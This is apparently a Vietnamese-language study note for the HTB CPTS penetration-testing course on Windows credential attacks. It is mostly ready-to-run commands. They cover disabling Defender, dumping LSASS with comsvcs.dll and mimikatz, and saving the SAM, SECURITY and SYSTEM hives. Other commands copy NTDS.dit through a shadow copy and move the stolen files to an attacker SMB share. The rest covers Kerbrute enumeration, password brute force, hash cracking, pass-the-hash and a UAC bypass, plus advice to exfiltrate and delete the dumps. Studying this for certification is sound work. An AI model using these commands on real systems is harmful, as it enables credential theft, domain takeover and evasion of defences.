---
title: "Windows Local Password Attacks"
date: 2026-04-16 09:00:00 +0700
categories: [HTB_CPTS, Credentials]
tags: [credentials, windows, password-attacks, credential-dumping]
description: "HTB CPTS note về Windows local password attacks và credential extraction."
pin: false
---
> **Overview Tổng hợp các kỹ thuật thu thập, dump và khai thác credentials trên môi trường Windows — từ recon ban đầu đến Pass-the-Hash.**

---

## 📂 Table of Contents

- Recon & Discovery
- LaZagne — Windows Credential Hunting
- LSASS Dump - Pull từ memory
- Registry Hives (SAM / SYSTEM / SECURITY)
- DPAPI — Decrypt Saved Credentials
- NTDS.dit (Domain Controller)
- Credential Manager

---

> **Credential Sources SAM, LSA, NTDS.dit, LSASS memory, Credential Manager, SMB Shares.**

---

## Recon & Discovery

```powershell
# Finding LSASS PID
tasklist /svc
Get-Process lsass

# Search password strings
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Credential Manager
cmdkey /list
runas /savecred /user:<user> cmd

# Share hunting
snaffler.exe -s
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

|Command / Option|Giải thích|
|---|---|
|`tasklist /svc`|`/svc` — hiển thị **service name** liên kết với mỗi process|
|`findstr /S`|Tìm **đệ quy** trong tất cả subdirectory|
|`findstr /I`|**Case-insensitive** — không phân biệt hoa/thường|
|`findstr /M`|Chỉ in **tên file** chứa match (không in nội dung dòng)|
|`/C:"password"`|Tìm đúng chuỗi ký tự `password` (kể cả có dấu cách)|
|`snaffler.exe -s`|`-s` = **stdout** — in kết quả ra terminal thay vì file|
|`-Threads 100`|Số luồng song song khi scan shares|

---

## LaZagne — Windows Credential Hunting

```cmd
start LaZagne.exe all
start LaZagne.exe all -vv
```

|Module|Tìm credentials ở đâu|
|---|---|
|`browsers`|Chrome, Firefox, Edge, Opera|
|`chats`|Skype,...|
|`mails`|Outlook, Thunderbird|
|`memory`|KeePass, LSASS|
|`sysadmin`|OpenVPN, WinSCP config files|
|`windows`|LSA secrets, Credential Manager|
|`wifi`|WiFi passwords|

> **Web browsers là nơi đặc biệt có giá trị — LaZagne hỗ trợ 35 browsers trên Windows. Nhiều app lưu credentials dạng cleartext trong config files.**

---

## LSASS Dump - Pull từ memory

```powershell
# Tắt Defender trước nếu bị block
Set-MpPreference -DisableRealtimeMonitoring $true

# Dump memory (thay 672 bằng PID thực tế)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full
#mimikazt
privilege::debug
sekurlsa::logonpasswords
```

```bash
# Phân tích dump file trên Kali
pypykatz lsa minidump /path/to/lsass.dmp
```

| Option                  | Giải thích                                                |
| ----------------------- | --------------------------------------------------------- |
| `comsvcs.dll, MiniDump` | Gọi hàm `MiniDump` từ DLL hợp lệ của Windows (**LOLBin**) |
| `Get-Process lsass`     | **PID của LSASS** — lấy từ `Get-Process lsass` trước đó   |
| `full`                  | Dump **toàn bộ** memory của process                       |
| `lsa minidump`          | Pypykatz đọc file dump định dạng Windows MiniDump         |

**4 loại thông tin trong output pypykatz:**

|Section|Chứa gì|Giá trị|
|---|---|---|
|MSV|NT hash + SHA1 hash|Crack offline hoặc Pass-the-Hash|
|WDIGEST|Cleartext password (Windows XP-8)|Có thể lấy password thẳng|
|Kerberos|Tickets, ekeys|Lateral movement trong domain|
|DPAPI|Masterkeys|Decrypt Chrome/Outlook passwords|

> **OPSEC Warning File `.dmp` rất dễ bị AV/EDR phát hiện — exfil ngay sau khi dump, xóa file khỏi target.**

---

## Registry Hives (SAM / SYSTEM / SECURITY)

```powershell
# Dump hives trên Windows target
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\security C:\security.save
reg.exe save hklm\system C:\system.save
```

```bash
# Tạo SMB share trên attack host để nhận file
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
  -smb2support CompData /home/user/Documents/
```

```cmd
# Chuyển file sang attack host
move sam.save \\<attacker_ip>\CompData
move security.save \\<attacker_ip>\CompData
move system.save \\<attacker_ip>\CompData
```

```bash
# Dump hashes offline
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -sam sam.save -security security.save -system system.save LOCAL

# Crack NT hashes
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Crack DCC2 hashes
hashcat -m 2100 '$DCC2$10240#administrator#<hash>' /usr/share/wordlists/rockyou.txt
```

|Option|Giải thích|
|---|---|
|`hklm\sam`|**HKEY_LOCAL_MACHINE\SAM** — chứa local user password hashes|
|`hklm\security`|Chứa **LSA secrets**, cached domain credentials (DCC2)|
|`hklm\system`|Chứa **SYSKEY** — cần để decrypt SAM và SECURITY|
|`-smb2support`|Bắt buộc — Windows mới tắt SMBv1 mặc định|
|`LOCAL`|Báo secretsdump xử lý **file offline**|

> **Tại sao cần cả 3 hive? SAM được mã hóa bằng **SYSKEY** nằm trong SYSTEM. SECURITY chứa thêm cached credentials và service account passwords.**

> **Output format của secretsdump `username:RID:LM_hash:NT_hash:::` `aad3b435b51404eeaad3b435b51404ee` = LM hash rỗng → chỉ lấy **NT hash** ở cuối để crack**

---

## DPAPI — Decrypt Saved Credentials

```cmd
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
mimikatz # dpapi::cache
mimikatz # dpapi::cred /in:"C:\Users\bob\AppData\Local\Microsoft\Credentials\<file>"
```

|Ứng dụng|Dữ liệu DPAPI bảo vệ|
|---|---|
|Chrome / IE|Saved passwords|
|Outlook|Email account passwords|
|RDP|Saved connection credentials|
|Credential Manager|Network shares, WiFi, VPN|

---

## NTDS.dit (Domain Controller)

### Bước 1 — Tạo Username List với Username Anarchy

```bash
./username-anarchy -i /path/to/names.txt > usernames.txt
```

|Option|Giải thích|
|---|---|
|`-i <file>`|**Input file** — danh sách `Firstname Lastname` mỗi dòng|

> **Output ví dụ `jane.doe`, `jdoe`, `doe.jane`, `j.doe`, `janed`,... — tất cả biến thể username phổ biến**

> **OSINT sources để tìm tên nhân viên: LinkedIn, website công ty, Google dork `"@company.com"` để lấy email → suy ra naming convention**

---

### Bước 2 — Recon Domain

```bash
netexec smb <ip>
```

Output sẽ trả về thông tin domain mà không cần credentials:

```
SMB  10.129.53.75  445  ILF-DC01  (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None)
```

> **Lấy domain từ output `(domain:ILF.local)` → dùng cho `--domain` trong Kerbrute và `-d` trong các tool khác**

---

### Bước 3 — Xác minh Username với Kerbrute

```bash
./kerbrute_linux_amd64 userenum --dc <ip> --domain <domain> usernames.txt
```

|Option|Giải thích|
|---|---|
|`userenum`|Chế độ **enumerate username** — không thử password|
|`--dc <ip>`|Địa chỉ IP của **Domain Controller**|
|`--domain <domain>`|Tên domain, ví dụ `inlanefreight.local`|
|`names.txt`|File chứa danh sách username cần kiểm tra|

> **Tại sao dùng Kerbrute trước khi spray? Kerbrute dùng Kerberos protocol để kiểm tra username **mà không cần thử password** → ít noise hơn, tránh lockout. Chỉ tấn công các username đã xác nhận tồn tại.**

> **Workflow chuẩn tấn công AD `Username Anarchy` → tạo list biến thể → `Kerbrute` xác minh username hợp lệ → `NetExec` spray password → có credentials → dump NTDS.dit**

---

### Bước 4 — Brute-force Password với NetExec

```bash
netexec smb <ip> -u <username> -p /usr/share/wordlists/fasttrack.txt
```

Output khi thành công:

```
[-] inlanefreight.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE
[-] inlanefreight.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE
[+] inlanefreight.local\bwilliamson:P@55w0rd!
```

|Option|Giải thích|
|---|---|
|`-u <username>`|Username đã xác minh từ Kerbrute|
|`-p <wordlist>`|Wordlist mật khẩu — `fasttrack.txt` cho AD, `rockyou.txt` cho general|
|`[-]`|Sai password — tiếp tục thử|
|`[+]`|Đúng password — dừng lại|

> **Account Lockout Policy Windows domain **mặc định không bật** lockout policy → brute-force thường không bị chặn. Tuy nhiên nếu tổ chức có cấu hình lockout → account bị khóa sau N lần sai → dùng Password Spraying thay thế.**

> **Wordlist nên dùng `fasttrack.txt` — nhỏ gọn, tập trung vào passwords phổ biến trong môi trường corporate (seasonal passwords, company names,...)**

---

### Bước 5 — Dump NTDS.dit

**Cách 1 — Thủ công qua VSS (từ trong Evil-WinRM session):**

```powershell
# Tạo Volume Shadow Copy
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit từ snapshot (thay ShadowCopy2 bằng tên thực tế)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Transfer về attack host (cần SMB share trên attack host trước)
cmd.exe /c move C:\NTDS\NTDS.dit \\<attacker_ip>\CompData
```

```bash
# Dump hashes offline (cần cả NTDS.dit và SYSTEM)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

**Cách 2 — Tự động 1 lệnh với NetExec (từ attack host):**

```bash
netexec smb <ip> -u <username> -p <password> -M ntdsutil
```

> **`-M ntdsutil` tự động toàn bộ pipeline: tạo VSS → dump → copy về `/home/<user>/.nxc/logs/*.ntds` → xóa dấu vết trên target. Không cần vào DC thủ công.**

|Option|Giải thích|
|---|---|
|`CREATE SHADOW /For=C:`|Tạo **Volume Shadow Copy** — snapshot nhất quán, không bị file lock|
|`\\?\GLOBALROOT\...`|Đường dẫn UNC để truy cập shadow copy|
|`-ntds NTDS.dit`|File NTDS.dit đã copy về|
|`-system SYSTEM`|SYSTEM hive — cần để decrypt hashes trong NTDS.dit|
|`LOCAL`|Xử lý **offline** thay vì kết nối trực tiếp|

> **Tại sao cần VSS? NTDS.dit đang được Active Directory liên tục sử dụng — không thể copy trực tiếp. VSS tạo snapshot nhất quán để copy an toàn.**

> **Tại sao cần cả NTDS.dit và SYSTEM? Giống SAM, hashes trong NTDS.dit được **mã hóa bằng key lưu trong SYSTEM** — thiếu một trong hai thì không decrypt được.**

> **Output format `username:RID:LM_hash:NT_hash:::` → lấy NT hash để crack với `hashcat -m 1000` hoặc dùng Pass-the-Hash trực tiếp**

---

### Bước 6 — Sử dụng Hashes (Crack hoặc Pass-the-Hash)

**Option A — Crack hash bằng Hashcat:**

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
# Output: 64f12cddaa88057e06a81b54e73b949b:Password1
```

**Option B — Pass-the-Hash trực tiếp (không cần crack):**

```bash
evil-winrm -i <ip> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

> **PtH hoạt động thế nào? NTLM authentication không cần plaintext password — chỉ cần hash để tính response. Attacker dùng hash trực tiếp thay vì password → không cần crack.**

> **Khi nào dùng PtH? Khi crack hash thất bại, hoặc cần **lateral movement** nhanh sang các máy khác trong domain sau khi có hash từ NTDS.dit.**

---

## Credential Manager

```powershell
cmdkey /list
rundll32 keymgr.dll,KRShowKeyMgr
runas /savecred /user:<username> cmd
```

|Option|Giải thích|
|---|---|
|`keymgr.dll,KRShowKeyMgr`|Gọi GUI Credential Manager để backup/restore credentials|
|`cmdkey /list`|Liệt kê tất cả credentials đang được lưu trong profile|
|`/savecred`|Dùng credential **đã lưu sẵn** — không cần nhập password|

> **runas /savecred Leo thang đặc quyền không cần biết password — chỉ cần credential đã được lưu trong Credential Manager.**

### Credential Manager — Mimikatz Dump

```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

> **Nếu không có special priv để chạy mimikatz thì có thể dùng msconfig Tại sao msconfig bypass UAC? msconfig.exe là trusted Windows binary được Microsoft ký → Windows tự động grant elevated token khi chạy → CMD launch từ msconfig kế thừa token đó.**

|Lệnh|Giải thích|
|---|---|
|privilege::debug|Yêu cầu SeDebugPrivilege — cần để đọc memory của process khác|
|sekurlsa::credman|Dump Credential Manager entries từ LSASS memory — lấy cleartext password|

---

## 🔗 Related Notes

- Password Attacks
- Linux Local Password Attacks
- Active Directory Attacks
- Lateral Movement
- Post Exploitation
